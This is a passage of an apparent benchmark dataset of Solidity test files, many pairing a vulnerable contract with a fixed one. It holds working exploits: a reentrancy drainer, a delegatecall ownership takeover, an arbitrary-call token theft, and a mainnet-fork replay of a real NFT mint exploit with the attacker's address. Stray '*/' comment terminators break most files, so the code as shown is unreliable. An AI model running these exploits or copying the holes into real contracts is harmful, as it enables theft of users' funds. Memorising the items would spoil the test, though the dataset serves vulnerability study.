    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testTransferFail() public {\n        SimpleBankContract.deposit{value: 1 ether}();\n        assertEq(SimpleBankContract.getBalance(), 1 ether);\n        vm.expectRevert();\n        SimpleBankContract.withdraw(1 ether);\n    }\n\n    function testCall() public {\n        FixedSimpleBankContract.deposit{value: 1 ether}();\n        assertEq(FixedSimpleBankContract.getBalance(), 1 ether);\n        FixedSimpleBankContract.withdraw(1 ether);\n    }\n\n    receive() external payable {\n        //just a example for out of gas\n        SimpleBankContract.deposit{value: 1 ether}();\n    }\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        // the issue is here\n        payable(msg.sender).transfer(amount);\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        (bool success, ) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \" Transfer of ETH Failed\");\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0010",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    VulnerableERC721 VulnerableERC721Contract;\n    FixedERC721 FixedERC721Contract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    function setUp() public {\n        VulnerableERC721Contract = new VulnerableERC721();\n        VulnerableERC721Contract.safeMint(alice, 1);\n        FixedERC721Contract = new FixedERC721();\n        FixedERC721Contract.safeMint(alice, 1);\n    }\n\n    function testVulnerableERC721() public {\n        VulnerableERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        VulnerableERC721Contract.transferFrom(address(alice), address(bob), 1);\n\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    function testFixedERC721() public {\n        FixedERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        vm.expectRevert();\n        FixedERC721Contract.transferFrom(address(alice), address(bob), 1);\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    receive() external payable {}\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract VulnerableERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //custom transferFrom function which missing NFT owner check.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        // direct transfer\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n}\n\ncontract FixedERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //Mitigation: add token owner check\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        require(\n            _isApprovedOrOwner(_msgSender(), tokenId),\n            \"ERC721: caller is not token owner or approved\"\n        );\n\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n*/\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0011",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    VulnPermit VulnPermitContract;\n    WETH9 WETH9Contract;\n\n    function setUp() public {\n        WETH9Contract = new WETH9();\n        VulnPermitContract = new VulnPermit(IERC20(address(WETH9Contract)));\n    }\n\n    function testVulnPhantomPermit() public {\n        address alice = vm.addr(1);\n        vm.deal(address(alice), 10 ether);\n\n        vm.startPrank(alice);\n        WETH9Contract.deposit{value: 10 ether}();\n        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);\n        vm.stopPrank();\n        console.log(\n            \"start WETH balanceOf this\",\n            WETH9Contract.balanceOf(address(this))\n        );\n\n        VulnPermitContract.depositWithPermit(\n            address(alice),\n            1000,\n            27,\n            0x0,\n            0x0\n        );\n        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));\n        console.log(\"WETH balanceOf VulnPermitContract\", wbal);\n\n        VulnPermitContract.withdraw(1000);\n\n        wbal = WETH9Contract.balanceOf(address(this));\n        console.log(\"WETH9Contract balanceOf this\", wbal);\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnPermit {\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        token = _token;\n    }\n\n    function deposit(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function depositWithPermit(\n        address target,\n        uint256 amount,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n        (bool success, ) = address(token).call(\n            abi.encodeWithSignature(\n                \"permit(address,uint256,uint8,bytes32,bytes32)\",\n                target,\n                amount,\n                v,\n                r,\n                s\n            )\n        );\n        require(success, \"Permit failed\");\n\n        require(\n            token.transferFrom(target, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function withdraw(uint256 amount) public {\n        require(token.transfer(msg.sender, amount), \"Transfer failed\");\n    }\n}\n\n// contract Permit {\n//     IERC20 public token;\n\n//     constructor(IERC20 _token) {\n//         token = _token;\n//     }\n\n//     function deposit(uint256 amount) public {\n//         require(\n//             token.transferFrom(msg.sender, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function depositWithPermit(\n//         address target,\n//         uint256 amount,\n//         uint8 v,\n//         bytes32 r,\n//         bytes32 s\n//     ) public {\n//         (bool success, ) = address(token).call(\n//             abi.encodeWithSignature(\n//                 \"permit(address,uint256,uint8,bytes32,bytes32)\",\n//                 target,\n//                 amount,\n//                 v,\n//                 r,\n//                 s\n//             )\n//         );\n//         require(success, \"Permit failed\");\n\n//         require(\n//             token.transferFrom(target, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function withdraw(uint256 amount) public {\n//         require(token.transfer(msg.sender, amount), \"Transfer failed\");\n//     }\n// }\n\ncontract WETH9 {\n    string public name = \"Wrapped Ether\";\n    string public symbol = \"WETH\";\n    uint8 public decimals = 18;\n\n    event Approval(address indexed src, address indexed guy, uint wad);\n    event Transfer(address indexed src, address indexed dst, uint wad);\n    event Deposit(address indexed dst, uint wad);\n    event Withdrawal(address indexed src, uint wad);\n\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n\n    fallback() external payable {\n        deposit();\n    }\n\n    receive() external payable {}\n\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    }\n\n    function totalSupply() public view returns (uint) {\n        return address(this).balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(\n        address src,\n        address dst,\n        uint wad\n    ) public returns (bool) {\n        require(balanceOf[src] >= wad);\n\n        if (\n            src != msg.sender && allowance[src][msg.sender] != type(uint128).max\n        ) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0012",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n*/\ninterface USDT {\n    function transfer(address to, uint256 value) external;\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external;\n}\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.transfer(address(this), 123); //revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        usdt.safeTransfer(address(this), 123);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0013",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n \ncontract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    Proxy proxy;\n    Delegate DelegateContract;\n    address alice;\n\n    function setUp() public {\n        alice = vm.addr(1);\n    }\n\n    function testDelegatecall() public {\n        DelegateContract = new Delegate(); // logic contract\n        proxy = new Proxy(address(DelegateContract)); // proxy contract\n\n        console.log(\"Alice address\", alice);\n        console.log(\"DelegationContract owner\", proxy.owner());\n\n        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.\n        console.log(\"Change DelegationContract owner to Alice...\");\n        vm.prank(alice);\n        address(proxy).call(abi.encodeWithSignature(\"pwn()\"));\n        // Proxy.fallback() will delegatecall Delegate.pwn()\n\n        console.log(\"DelegationContract owner\", proxy.owner());\n        console.log(\n            \"Exploit completed, proxy contract storage has been manipulated\"\n        );\n    }\n}\n\ncontract Delegate {\n    address public owner; // slot0\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0014",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    BuggyBankManager buggyManager;\n    FixedBankManager fixedManager;\n\n    function setUp() public {\n        buggyManager = new BuggyBankManager();\n        fixedManager = new FixedBankManager();\n        \n        // Initialize both managers with the same 3 banks\n        address[] memory initialBanks = new address[](3);\n        string[] memory initialNames = new string[](3);\n        \n        initialBanks[0] = address(0x1);\n        initialNames[0] = \"ABC Bank\";\n        \n        initialBanks[1] = address(0x2);\n        initialNames[1] = \"XYZ Bank\";\n        \n        initialBanks[2] = address(0x3);\n        initialNames[2] = \"Global Bank\";\n        \n        buggyManager.addBanks(initialBanks, initialNames);\n        fixedManager.addBanks(initialBanks, initialNames);\n        \n        // Verify initial state\n        emit log_string(\"Initial state of both bank managers:\");\n        emit log_named_uint(\"Buggy manager bank count\", buggyManager.getBankCount());\n        emit log_named_uint(\"Fixed manager bank count\", fixedManager.getBankCount());\n    }\n\n    function testReturnVsBreak() public {\n        // Try to remove all banks marked for removal\n        emit log_string(\"\\nRemoving banks marked for removal\");\n        \n        // Mark all banks for removal\n        address[] memory banksToRemove = new address[](3);\n        banksToRemove[0] = address(0x1); // ABC Bank\n        banksToRemove[1] = address(0x2); // XYZ Bank\n        banksToRemove[2] = address(0x3); // Global Bank\n        console.log(\"------------Testing buggyManager---------------\");\n        // With buggy implementation (using return)\n        buggyManager.removeBanksWithReturn(banksToRemove);\n        emit log_named_uint(\"Buggy manager (with return) bank count after removal\", buggyManager.getBankCount());\n        buggyManager.listBanks();\n\n        console.log(\"------------Testing FixedBankManager---------------\");\n        // With fixed implementation (using break)\n        fixedManager.removeBanksWithBreak(banksToRemove);\n        emit log_named_uint(\"Fixed manager (with break) bank count after removal\", fixedManager.getBankCount());\n        fixedManager.listBanks();\n    }\n}\n\n// Base contract with common functionality\ncontract BankManager {\n    struct Bank {\n        address bankAddress;\n        string bankName;\n    }\n\n    Bank[] public banks;\n    \n    // Add multiple banks\n    function addBanks(address[] memory addresses, string[] memory names) public {\n        require(addresses.length == names.length, \"Arrays must have the same length\");\n        \n        for (uint i = 0; i < addresses.length; i++) {\n            banks.push(Bank(addresses[i], names[i]));\n        }\n    }\n    \n    // Get the number of banks\n    function getBankCount() public view returns (uint) {\n        return banks.length;\n    }\n    \n    // Get a specific bank\n    function getBank(uint index) public view returns (address, string memory) {\n        require(index < banks.length, \"Index out of bounds\");\n        return (banks[index].bankAddress, banks[index].bankName);\n    }\n    \n    // Helper function to remove a bank at a specific index\n    function _removeBank(uint index) internal {\n        require(index < banks.length, \"Index out of bounds\");\n        \n        // Move the last element to the deleted position\n        if (index < banks.length - 1) {\n            banks[index] = banks[banks.length - 1];\n        }\n        \n        // Remove the last element\n        banks.pop();\n    }\n}\n\n// Buggy implementation using 'return' incorrectly\ncontract BuggyBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // BUG: Using 'return' causes premature exit after removing only one bank\n    function removeBanksWithReturn(address[] memory banksToRemove) public {\n        for (uint i = 0; i < banks.length; i++) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[i].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[i].bankName, \n                        \" (Address: \", toHexString(uint160(banks[i].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(i);\n                    return; // BUG: This exits the entire function after removing just one bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in buggy manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n\n// Fixed implementation using proper iteration\ncontract FixedBankManager is BankManager, Test {\n    // Remove all banks in the provided list\n    // FIXED: Using proper iteration to remove multiple elements\n    function removeBanksWithBreak(address[] memory banksToRemove) public {\n        // We need to iterate backwards to avoid index issues when removing elements\n        for (int i = int(banks.length) - 1; i >= 0; i--) {\n            for (uint j = 0; j < banksToRemove.length; j++) {\n                if (banks[uint(i)].bankAddress == banksToRemove[j]) {\n                    emit log_string(string(abi.encodePacked(\n                        \"Removing bank: \", banks[uint(i)].bankName, \n                        \" (Address: \", toHexString(uint160(banks[uint(i)].bankAddress)), \")\"\n                    )));\n                    \n                    _removeBank(uint(i));\n                    break; // FIXED: Only break from the inner loop, continue with the next bank\n                }\n            }\n        }\n    }\n    \n    // Helper function to list all banks in this manager\n    function listBanks() public {\n        emit log_string(\"Banks in fixed manager:\");\n        for (uint i = 0; i < banks.length; i++) {\n            emit log_string(string(abi.encodePacked(\n                \"Bank \", toString(i), \": \", \n                banks[i].bankName, \" (Address: \", \n                toHexString(uint160(banks[i].bankAddress)), \")\"\n            )));\n        }\n    }\n    \n    // Helper function to convert uint to string\n    function toString(uint value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0\";\n        }\n        uint temp = value;\n        uint digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n    \n    // Helper function to convert address to hex string\n    function toHexString(uint value) internal pure returns (string memory) {\n        bytes16 hexSymbols = \"0123456789abcdef\";\n        uint length = 40; // 20 bytes * 2 characters per byte\n        bytes memory buffer = new bytes(2 + length);\n        buffer[0] = '0';\n        buffer[1] = 'x';\n        for (uint i = 2 + length - 1; i >= 2; i--) {\n            buffer[i] = hexSymbols[value & 0xf];\n            value >>= 4;\n        }\n        return string(buffer);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0015",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n*/\n \n\ncontract ContractTest is DSTest {\n    IFantasticWeslie nftContract =\n        IFantasticWeslie(0xf6FFBa463e46087FcdC3a51391bB675B0e2C1a40); // Fantastic Weslie\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    bytes32[] merkleTreeProof;\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16023847);\n    }\n\n    function testExploit() public {\n        //Since the contract is vulnerable to CVE-2022-38217\n        //it could lead to the early disclosure of metadata of all NFTs in the project\n\n        //View Metadata of the NFTs via cURL -> curl -k https://bafybeic23x4v75z7isyqhy5p6ylzqutm6lnpobwngaouovdu6qjjvt4wpu.ipfs.dweb.link/142.json\n        //The issue is the metadata should be visible after the minting is completed\n\n        //etherscan tx - 0xfa4434236d2a9717e3410d7cdc60eed6acfddb054f58bc779c07349a1f45ce6b\n        //etherscan tx - 0x24af97355f6cec4ae02fff8bbf7144a02857e3ffd36a650aa295c62f6272cc83\n\n        address attacker = 0x1fCebBb5D3EACd26e70b0BD1E54a979a479906aA;\n        cheats.prank(attacker);\n\n        merkleTreeProof.push(\n            0x0ea49bae9ab4f8b82fb0e0b5e876576c9a4a945edc2fa5a7b448fad470802ae6\n        );\n        merkleTreeProof.push(\n            0x852233af3700b87dc51f6abf53d4f935746d746d84a33d4d7e6302d9c110fedd\n        );\n        merkleTreeProof.push(\n            0x5de513269badb3a0b73e237a9f28f86994791f4421effd1865df975a0f8ee52c\n        );\n        merkleTreeProof.push(\n            0xe52d780f15394a8f6254f328ca06a66909c41f1ee3adab33d02cd087f8c37604\n        );\n        merkleTreeProof.push(\n            0xede88505e4259ab482a1019cc8d4364cf9e1e7866768245854c0f6e369d2b08c\n        );\n        merkleTreeProof.push(\n            0x776fee48d9285a8e2d1ecde47354e9ebe91b10f0b5f2d754968af831a7047808\n        );\n        merkleTreeProof.push(\n            0x3d13c4757d9e35123b8785040c29f232483941fb7d591b1a94167c1ca5e8875f\n        );\n        merkleTreeProof.push(\n            0xc36c091c358833709f1b6f44e783e5d9ad5ad9f5f0ee09a37c376fd354827fb1\n        );\n        merkleTreeProof.push(\n            0xce26991b2af9fc0fb807aea36667d37439ae7122d3ea8edcbfe92b04bf674922\n        );\n        merkleTreeProof.push(\n            0x8452c207732923a758c53fb296f3d88340a04fe9c381c73ba44343a45340953e\n        );\n        merkleTreeProof.push(\n            0xcc44822b3b5a19839899f6795622daff3bab327895558977ea58a30a42c6a49e\n        );\n        merkleTreeProof.push(\n            0x45c575962e5a88b5e8c3aedf4e3e74306d0124f4cc86c25bc4cd1bcae16c54a0\n        );\n\n        nftContract.mint{value: 0.12 ether}(merkleTreeProof);\n\n        console.log(\"Owner of NFT#142 : \", nftContract.ownerOf(142));\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0016",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\n*/\n\nimport \"forge-std/Test.sol\";\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n\n    function testUnsafeCall() public {\n        address alice = vm.addr(1);\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n\n        // bytes memory payload = abi.encodeWithSignature(\"transfer(address,uint256)\",address(alice),1000);\n\n        console.log(\n            \"Alice tries to perform unsafe call to transfer asset from TokenWhaleContract\"\n        );\n        vm.prank(alice);\n        TokenWhaleContract.approveAndCallcode(\n            address(TokenWhaleContract),\n            0x1337,\n            abi.encodeWithSignature(\n                \"transfer(address,uint256)\",\n                address(alice),\n                1000\n            )\n        );\n\n        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);\n        console.log(\"Exploit completed\");\n        console.log(\n            \"TokenWhale balance:\",\n            TokenWhaleContract.balanceOf(address(TokenWhaleContract))\n        );\n        console.log(\n            \"Alice balance:\",\n            TokenWhaleContract.balanceOf(address(alice))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000; // 1 mil\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n\n    /* Approves and then calls the contract code*/\n\n    function approveAndCallcode(\n        address _spender,\n        uint256 _value,\n        bytes memory _extraData\n    ) public {\n        allowance[msg.sender][_spender] = _value;\n\n        bool success;\n        // vulnerable call execute unsafe user code\n        (success, ) = _spender.call(_extraData);\n        console.log(\"success:\", success);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0017",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n*/\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n\n    function withdraw(uint256 wad) external;\n}\n\ncontract ContractTest is Test {\n    address UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap Router address on Ethereum Mainnet\n    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n    }\n\n    function testswapTokensWithMaxDeadline() external payable {\n        WETH.approve(address(UNISWAP_ROUTER), type(uint256).max);\n        WETH.deposit{value: 1 ether}();\n\n        uint256 amountIn = 1 ether;\n        uint256 amountOutMin = 0;\n        //uint256 amountOutMin = 1867363899; //1867363899 INSUFFICIENT_OUTPUT_AMOUNT\n        // Path for swapping ETH to USDT\n        address[] memory path = new address[](2);\n        path[0] = address(WETH); // WETH (Wrapped Ether)\n        path[1] = USDT; // USDT (Tether)\n\n        // No Effective Expiration Deadline\n        // The function sets the deadline to the maximum uint256 value, which means the transaction can be executed at any time,\n        // possibly under unfavorable market conditions.\n        IUniswapV2Router02(UNISWAP_ROUTER).swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            address(this),\n            type(uint256).max // Setting deadline to max value\n        );\n\n        console.log(\"USDT\", IERC20(USDT).balanceOf(address(this)));\n    }\n\n    receive() external payable {}\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0018",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n\n        // check if after send still enough to avoid underflow\n        if (balances[msg.sender] >= _weiToWithdraw) {\n            balances[msg.sender] -= _weiToWithdraw;\n        }\n    }\n}\n\ncontract EtherStoreRemediated {\n    mapping(address => uint256) public balances;\n    bool internal locked;\n\n    modifier nonReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        balances[msg.sender] -= _weiToWithdraw;\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherStore store;\n    EtherStoreRemediated storeRemediated;\n    EtherStoreAttack attack;\n    EtherStoreAttack attackRemediated;\n\n    function setUp() public {\n        store = new EtherStore();\n        storeRemediated = new EtherStoreRemediated();\n        attack = new EtherStoreAttack(address(store));\n        attackRemediated = new EtherStoreAttack(address(storeRemediated));\n        vm.deal(address(store), 5 ether);\n        vm.deal(address(storeRemediated), 5 ether);\n        vm.deal(address(attack), 2 ether);\n        vm.deal(address(attackRemediated), 2 ether);\n    }\n\n    function testReentrancy() public {\n        attack.Attack();\n    }\n\n    function test_RevertRemediated() public {\n        attackRemediated.Attack();\n    }\n}\n\ncontract EtherStoreAttack is Test {\n    EtherStore store;\n\n    constructor(address _store) {\n        store = EtherStore(_store);\n    }\n\n    function Attack() public {\n        console.log(\"EtherStore balance\", address(store).balance);\n\n        store.deposit{value: 1 ether}();\n\n        console.log(\n            \"Deposited 1 Ether, EtherStore balance\",\n            address(store).balance\n        );\n        store.withdrawFunds(1 ether);\n\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", address(store).balance);\n    }\n\n    // fallback() external payable {}\n\n    receive() external payable {\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", address(store).balance);\n        if (address(store).balance >= 1 ether) {\n            store.withdrawFunds(1 ether);\n        }\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0019",
    "language": "solidity",
    "chain": "evm",
